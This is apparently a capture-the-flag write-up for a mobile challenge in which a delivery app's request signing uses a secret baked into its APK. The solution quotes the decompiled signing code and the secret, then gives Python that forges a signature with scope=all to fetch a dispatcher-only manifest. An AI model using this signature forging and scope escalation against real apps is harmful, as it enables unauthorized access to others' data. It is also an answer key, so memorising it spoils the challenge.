# Signed, Sealed, Delivered

**Category:** mobile  **Difficulty:** medium  **Author:** abu

> FleetLink is what our delivery drivers use to pull their trip sheets, and the backend is careful: it hands each driver their own trips and nothing else. Above all that sits the dispatcher's full fleet manifest, the one no driver is ever meant to see.
>
> Sign for it yourself.

Handout: `handout/fleetlink-4.1.0.apk.zip`. Per-team Flask API (`backend/`) on port 8080. `FLEET_APP_SECRET` defaults to the value compiled into the APK, so leave it alone unless you rebuild the app.

## Solution

Point the app at your instance and tap "Load my trips". It sends a signed `GET /api/v1/trips?scope=mine` and gets a 200. Every request carries `X-Device-Id`, `X-Ts` and `X-Sig`, and the signature covers the path, the query and the timestamp, so replaying a captured request with a different scope doesn't work. We need the scheme.

`com/fleetlink/Signer.java` in jadx has all of it:

```java
private static final String APP_SECRET = "fleetlink_signing_pepper_v3";
String canonical = method + "\n" + path + "\n" + q + "\n" + ts;   // q = sorted k=v&...
byte[] key = MessageDigest.getInstance("SHA-256")
        .digest((APP_SECRET + ":" + deviceId).getBytes("UTF-8"));
// X-Sig = hex(HMAC-SHA256(key, canonical))
```

The device id is whatever we send in `X-Device-Id`, so we can sign anything ourselves. Asking `/api/v1/fleet/manifest` with `scope=mine` gives a helpful error:

```
scope 'mine' cannot list the full fleet; requires scope=all (dispatcher)
```

The app never sends `scope=all`, and that's the only thing guarding it. Re-sign with it:

```python
key = sha256(b"fleetlink_signing_pepper_v3:" + device_id).digest()
canonical = f"GET\n/api/v1/fleet/manifest\nscope=all\n{ts}"
sig = hmac.new(key, canonical.encode(), sha256).hexdigest()
```

```
python3 solution/solve.py http://<host>:<port>
```

`dispatcher_manifest_signing_key` in the response is the flag. Dynamic, one per team.
